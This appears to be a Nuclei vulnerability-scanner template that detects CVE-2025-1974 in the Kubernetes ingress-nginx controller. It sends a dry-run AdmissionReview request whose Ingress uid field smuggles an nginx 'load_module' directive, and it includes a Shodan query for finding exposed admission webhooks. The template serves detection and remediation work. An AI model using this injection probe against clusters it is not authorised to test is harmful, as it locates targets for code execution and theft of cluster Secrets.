http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - AdmissionReview
    - load_module
    - directive is specified too late
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"\
    kind\": \"AdmissionReview\",\n  \"apiVersion\": \"admission.k8s.io/v1\",\n  \"\
    request\": {\n    \"uid\": \"{{string}}\",\n    \"kind\": {\n      \"group\":\
    \ \"networking.k8s.io\",\n      \"version\": \"v1\",\n      \"kind\": \"Ingress\"\
    \n    },\n    \"resource\": {\n      \"group\": \"networking.k8s.io\",\n     \
    \ \"version\": \"v1\",\n      \"resource\": \"ingresses\"\n    },\n    \"requestKind\"\
    : {\n      \"group\": \"networking.k8s.io\",\n      \"version\": \"v1\",\n   \
    \   \"kind\": \"Ingress\"\n    },\n    \"requestResource\": {\n      \"group\"\
    : \"networking.k8s.io\",\n      \"version\": \"v1\",\n      \"resource\": \"ingresses\"\
    \n    },\n    \"name\": \"test-{{randstr}}\",\n    \"namespace\": \"default\"\
    ,\n    \"operation\": \"CREATE\",\n    \"userInfo\": {\n      \"uid\": \"{{string}}\"\
    \n    },\n    \"object\": {\n      \"kind\": \"Ingress\",\n      \"apiVersion\"\
    : \"networking.k8s.io/v1\",\n      \"metadata\": {\n        \"name\": \"test-{{randstr}}\"\
    ,\n        \"namespace\": \"default\",\n        \"creationTimestamp\": null,\n\
    \        \"uid\": \"InjectTest#;\\n\\n}\\n}\\n}\\nload_module test;\",\n     \
    \   \"annotations\": {\n          \"nginx.ingress.kubernetes.io/mirror-target\"\
    : \"fake-mirror-target\"\n        }\n      },\n      \"spec\": {\n        \"ingressClassName\"\
    : \"nginx\",\n        \"rules\": [\n          {\n            \"host\": \"test.example.com\"\
    ,\n            \"http\": {\n              \"paths\": [\n                {\n  \
    \                \"path\": \"/\",\n                  \"pathType\": \"Prefix\"\
    ,\n                  \"backend\": {\n                    \"service\": {\n    \
    \                  \"name\": \"kubernetes\",\n                      \"port\":\
    \ {\n                        \"number\": 443\n                      }\n      \
    \              }\n                  }\n                }\n              ]\n  \
    \          }\n          }\n        ]\n      },\n      \"status\": {\n        \"\
    loadBalancer\": {}\n      }\n    },\n    \"oldObject\": null,\n    \"dryRun\"\
    : true,\n    \"options\": {\n      \"kind\": \"CreateOptions\",\n      \"apiVersion\"\
    : \"meta.k8s.io/v1\"\n    }\n  }\n}\n"
id: CVE-2025-1974
info:
  author: iamnoooob,rootxharsh,pdresearch,UNC1739
  classification:
    cve-id: CVE-2025-1974
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-653
    epss-percentile: 0.99671
    epss-score: 0.91853
  description: 'A security issue was discovered in Kubernetes where under certain
    conditions, an unauthenticated attacker with access to the pod network can achieve
    arbitrary code execution in the context of the ingress-nginx controller. This
    can lead to disclosure of Secrets accessible to the controller. (Note that in
    the default installation, the controller can access all Secrets cluster-wide.)

    '
  impact: 'Vulnerable versions of Ingress-Nginx controller can be exploited to gain
    unauthorized access to all secrets across namespaces in the Kubernetes cluster,
    potentially leading to complete cluster takeover.

    '
  metadata:
    max-request: 1
    shodan-query: ssl:"ingress-nginx" port:8443
    verified: true
  name: Ingress-Nginx Controller - Remote Code Execution
  reference:
  - https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
  - https://projectdiscovery.io/blog/ingressnightmare-unauth-rce-in-ingress-nginx
  - https://nvd.nist.gov/vuln/detail/CVE-2025-1974
  - https://https://github.com/kubernetes/kubernetes/issues/131009
  - https://github.com/eeeeeeeeee-code/POC
  remediation: 'Update to one of the following versions: Version 1.12.1 or later /
    Version 1.11.5 or later

    '
  severity: critical
  tags: cve,cve2025,cloud,devops,kubernetes,ingress,nginx,k8s,vuln
variables:
  string: '{{to_lower(''{{randstr}}'')}}'
